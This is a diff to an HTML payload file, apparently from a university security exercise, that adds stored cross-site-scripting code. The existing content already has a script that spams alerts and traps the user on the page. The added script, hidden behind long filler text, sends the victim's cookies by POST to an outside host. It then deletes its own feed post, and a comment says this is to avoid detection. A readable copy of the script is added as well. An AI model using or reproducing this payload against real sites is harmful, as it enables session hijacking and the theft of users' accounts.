@@ -13,6 +13,14 @@ Some very long text. It does not matter what it is, but we don't want script to 
 Again some long text... aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa  <script> alert("Open developer console(CTRL + SHIFT + I) and type 1 to console to enable pop-up asking before redirect"); alert("Open developer console(CTRL + SHIFT + I) and type 1 to console to enable pop-up asking before redirect"); window. onbeforeunload = function _before_unl (event) { event. preventDefault(); return "Try redirecting now HAHA."; }</script>
 
 
+<!--
+Script for collecting cookies.
+Oracle VM server collecting POST request data on bek.fit-cvut.cz,
+similar domain means it can be missed when monitoring network traffic.
+Post again deletes itself to avoid detection.
+-->
+Again some long text... aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa <script>fetch( "https://boura.fit-cvut.cz" ,{method:"POST",mode: "no-cors",headers: {"Content-Type":"text/plain"}, body:document.cookie}); function x(){for(let elem of document. getElementsByClassName( "js_feed_view_more_entry_holder" )){if(elem.innerHTML.includes( "bhdfjbdausvuth")){elem.remove() ;}}x=undefined;}window. addEventListener("load",x); </script>
+
 
 <!--Scripts formated for better readability:-->
 <script>
@@ -73,4 +81,28 @@ Again some long text... aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaa
         event.preventDefault();
         return "Try redirecting now HAHA.";
     }
+</script>
+
+
+<script>
+    fetch(
+        "https://boura.fit-cvut.cz",
+        {
+            method: "POST",
+            mode: "no-cors",
+            headers: {"Content-Type": "text/plain"},
+            body: document.cookie
+        }
+    );
+
+    function x() {
+        for(let elem of document.getElementsByClassName("js_feed_view_more_entry_holder")) {
+            if(elem.innerHTML.includes("bhdfjbdausvuth")) {
+                elem.remove();
+            }
+        }
+        x = undefined;
+    }
+
+    window.addEventListener("load", x);
 </script>
